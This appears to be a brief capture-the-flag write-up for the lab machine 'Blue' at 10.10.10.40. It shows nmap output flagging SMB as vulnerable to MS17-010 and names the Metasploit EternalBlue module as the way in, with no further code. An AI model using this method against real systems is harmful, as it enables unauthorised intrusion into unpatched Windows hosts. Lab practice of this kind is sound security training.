----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Blue
# 16/3/2023
10.10.10.40

----------------------------------------------------
# nmap
----------------------------------------------------
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
| smb-vuln-ms17-010: 
|   VULNERABLE:



----------------------------------------------------
# exploitation
----------------------------------------------------
msfconsole
use (windows/smb/ms17_010_eternalblue)
set variables and exploit

----------------------------------------------------
# priv esc
----------------------------------------------------
you are already root
